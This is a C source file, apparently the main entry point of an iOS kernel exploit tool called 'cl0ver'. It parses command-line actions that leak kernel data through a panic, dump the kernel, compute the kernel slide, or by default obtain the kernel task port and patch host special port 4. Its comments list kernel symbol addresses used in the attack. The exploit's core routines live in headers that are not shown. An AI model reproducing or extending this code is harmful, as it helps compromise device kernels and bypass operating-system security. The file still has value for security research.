#include <string.h>             // strcmp, strncmp
#include <unistd.h>             // sync

#include "common.h"             // ASSERT, WARN, log_init, log_release, sanity
#include "exploit.h"            // dump_kernel, exploit, panic_leak
#include "io.h"                 // OSData, OSString
#include "offsets.h"            // off_cfg
#include "slide.h"              // get_kernel_slide

#define CONFIG_PATH "/etc/cl0ver"

enum
{
    actPwn,
    actPanic,
    actDump,
    actSlide,
};

int main(int argc, const char **argv)
{
    // ffffff800445a1dc T _is_io_registry_entry_get_property_bytes
    // ffffff8004536000 S _ipc_kernel_map
    // ffffff8004536370 S __ZN8OSSymbol10gMetaClassE
    // ffffff8004536348 S __ZN8OSString10gMetaClassE

    // 6,1 ffffff80044eda08 S __ZTV11OSMetaClass
    // 8,4 ffffff80044ef460 S __ZTV11OSMetaClass

    // 8,4 ffffff80044ef1f0 S __ZTV8OSString

    log_init(NULL);
    int action = actPwn;
    size_t off;
    for(off = 1; off < argc; ++off)
    {
        if(strncmp(argv[off], "log=", 4) == 0)
        {
            log_init(&argv[off][4]);
        }
        else if(strcmp(argv[off], "panic") == 0)
        {
            action = actPanic;
        }
        else if(strcmp(argv[off], "dump") == 0)
        {
            action = actDump;
        }
        else if(strcmp(argv[off], "slide") == 0)
        {
            action = actSlide;
        }
        else
        {
            WARN("Unrecognized argument: %s", argv[off]);
            return 1;
        }
    }

    sanity();
    off_cfg(CONFIG_PATH);

    switch(action)
    {
        case actPanic:
            panic_leak();
            break;
        case actDump:
            dump_kernel("kernel.bin");
            break;
        case actSlide:
            get_kernel_slide();
            break;
        case actPwn:
            //exploit(CONFIG_PATH);
            patch_host_special_port_4(get_kernel_task(CONFIG_PATH));
            break;
        default:
            WARN("This should never happen");
            return 1;
    }

    log_release();
    return 0;
}
